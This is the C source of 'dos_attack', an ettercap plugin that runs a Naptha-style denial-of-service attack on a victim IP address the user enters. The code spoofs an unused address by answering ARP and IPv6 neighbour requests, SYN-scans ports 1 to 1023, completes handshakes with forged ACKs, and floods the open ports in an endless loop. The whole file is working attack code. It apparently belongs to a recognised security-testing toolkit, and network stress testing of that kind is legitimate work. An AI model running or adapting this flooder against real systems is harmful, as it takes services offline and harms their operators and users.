/*
    dos_attack -- ettercap plugin -- Run a D.O.S. attack (based on Naptha)

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_hook.h>
#include <ec_packet.h>
#include <ec_send.h>                   
#include <ec_threads.h>
#include <time.h>

/* protos */
int plugin_load(void *);
static int dos_attack_init(void *);
static int dos_attack_fini(void *);
static void parse_arp(struct packet_object *po);

#ifdef WITH_IPV6
static void parse_icmp6(struct packet_object *po);
#endif
static void parse_tcp(struct packet_object *po);
EC_THREAD_FUNC(syn_flooder);

struct port_list {
   u_int16 port;
   SLIST_ENTRY(port_list) next;
};


/* globals */
static struct ip_addr fake_host;
static struct ip_addr victim_host;
SLIST_HEAD(, port_list) port_table;

/* plugin operations */
struct plugin_ops dos_attack_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "dos_attack",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Run a d.o.s. attack against an IP address",  
   /* the plugin version. */ 
   .version =           "1.0",   
   /* activation function */
   .init =              &dos_attack_init,
   /* deactivation function */                     
   .fini =              &dos_attack_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   return plugin_register(handle, &dos_attack_ops);
}

/******************* STANDARD FUNCTIONS *******************/

static int dos_attack_init(void *dummy) 
{ 
   char dos_addr[MAX_ASCII_ADDR_LEN];
   char unused_addr[MAX_ASCII_ADDR_LEN];
   struct port_list *p;
         
   /* It doesn't work if unoffensive */
   if (GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("dos_attack: plugin doesn't work in UNOFFENSIVE mode\n");
      return PLUGIN_FINISHED;
   }
   
   /* don't show packets while operating */
   GBL_OPTIONS->quiet = 1;

   memset(dos_addr, 0, sizeof(dos_addr));
   memset(unused_addr, 0, sizeof(dos_addr));

   ui_input("Insert victim IP: ", dos_addr, sizeof(dos_addr), NULL);
   if (ip_addr_pton(dos_addr, &victim_host) == -EINVALID) {
      INSTANT_USER_MSG("dos_attack: Invalid IP address.\n");
      return PLUGIN_FINISHED;
   }

   ui_input("Insert unused IP: ", unused_addr, sizeof(unused_addr), NULL);
   if (ip_addr_pton(unused_addr, &fake_host) == -EINVALID) {
      INSTANT_USER_MSG("dos_attack: Invalid IP address.\n");
      return PLUGIN_FINISHED;
   }

   if(victim_host.addr_type != fake_host.addr_type) {
      INSTANT_USER_MSG("dos_attack: Address' families don't match.\n");
      return PLUGIN_FINISHED;
   }

   INSTANT_USER_MSG("dos_attack: Starting scan against %s [Fake Host: %s]\n", dos_addr, unused_addr);

   /* Delete the "open" port list just in case of previous executions */
   while (!SLIST_EMPTY(&port_table)) {
      p = SLIST_FIRST(&port_table);
      SLIST_REMOVE_HEAD(&port_table, next);
      SAFE_FREE(p);
   }

   /* Add the hook to "create" the fake host */
   if(ntohs(fake_host.addr_type) == AF_INET)
      hook_add(HOOK_PACKET_ARP_RQ, &parse_arp);
#ifdef WITH_IPV6
   else if(ntohs(fake_host.addr_type) == AF_INET6)
      hook_add(HOOK_PACKET_ICMP6_NSOL, &parse_icmp6);
#endif

   /* Add the hook for SYN-ACK reply */
   hook_add(HOOK_PACKET_TCP, &parse_tcp);

   /* create the flooding thread */
   ec_thread_new("golem", "SYN flooder thread", &syn_flooder, NULL);

   return PLUGIN_RUNNING;
}


static int dos_attack_fini(void *dummy) 
{
   pthread_t pid;

   /* Remove the hooks */
   hook_del(HOOK_PACKET_ARP_RQ, &parse_arp);
   hook_del(HOOK_PACKET_TCP, &parse_tcp);
   
   pid = ec_thread_getpid("golem");
   
   /* the thread is active or not ? */
   if (!pthread_equal(pid, EC_PTHREAD_NULL))
      ec_thread_destroy(pid);

   INSTANT_USER_MSG("dos_attack: plugin terminated...\n");

   return PLUGIN_FINISHED;   
}

/*********************************************************/

/* 
 * This thread first sends SYN packets to some ports (a little port scan) 
 * then starts to flood active ports with other SYN packets.
 */
EC_THREAD_FUNC(syn_flooder)
{
   u_int16 sport = 0xe77e, dport;
   u_int32 seq = 0xabadc0de;
   struct port_list *p;

#if !defined(OS_WINDOWS)
   struct timespec tm;
   tm.tv_sec = 0;
   tm.tv_nsec = 1000*1000;
#endif
   /* init the thread and wait for start up */
   ec_thread_init();
 
   /* First "scan" ports from 1 to 1024 */
   for (dport=1; dport<1024; dport++) {
      send_tcp(&fake_host, &victim_host, sport++, htons(dport), seq++, 0, TH_SYN, NULL, 0);
#if !defined(OS_WINDOWS)
      nanosleep(&tm, NULL);
#else
      usleep(1000);
#endif
   }

   INSTANT_USER_MSG("dos_attack: Starting attack...\n");
   
   /* Continue flooding open ports */
   LOOP {
      CANCELLATION_POINT();

      SLIST_FOREACH(p, &port_table, next)    
         send_tcp(&fake_host, &victim_host, sport++, p->port, seq++, 0, TH_SYN, NULL, 0);
	 
#if !defined(OS_WINDOWS)
      nanosleep(&tm, NULL);
#else
      usleep(1000);
#endif
   }
   
   return NULL;
}

/* Parse the arp packets and reply for the fake host */
static void parse_arp(struct packet_object *po)
{
   if (!ip_addr_cmp(&fake_host, &po->L3.dst)) 
      send_arp(ARPOP_REPLY, &po->L3.dst, GBL_IFACE->mac, &po->L3.src, po->L2.src);
}

#ifdef WITH_IPV6
static void parse_icmp6(struct packet_object *po)
{
   struct ip_addr ip;
   ip_addr_init(&ip, AF_INET6, po->L4.options);
   if(!ip_addr_cmp(&fake_host, &ip))
      send_icmp6_nadv(&fake_host, &po->L3.src, &fake_host, GBL_IFACE->mac, 0);
}
#endif

/* 
 * Populate the open port list and reply to 
 * SYN-ACK packets from victim host
 */
static void parse_tcp(struct packet_object *po)
{
   struct port_list *p;
   
   /* Check if it's a reply to our SYN flooding */
   if (ip_addr_cmp(&fake_host, &po->L3.dst) ||
       ip_addr_cmp(&victim_host, &po->L3.src) || 
       po->L4.flags != (TH_SYN | TH_ACK))  
          return;
	  
   /* Complete the handshake with an ACK */
   send_tcp(&fake_host, &victim_host, po->L4.dst, po->L4.src, po->L4.ack, htonl( ntohl(po->L4.seq) + 1), TH_ACK, NULL, 0);
   
   /* Check if the port is already in the "open" list... */
   SLIST_FOREACH(p, &port_table, next) 
      if (p->port == po->L4.src)
         return;
   
   /* If not...put it in */
   SAFE_CALLOC(p, 1, sizeof(struct port_list));
   p->port = po->L4.src;
   SLIST_INSERT_HEAD(&port_table, p, next);
   
   INSTANT_USER_MSG("dos_attack: Port %d added\n", ntohs(p->port));
}

/* EOF */

// vim:ts=3:expandtab
 
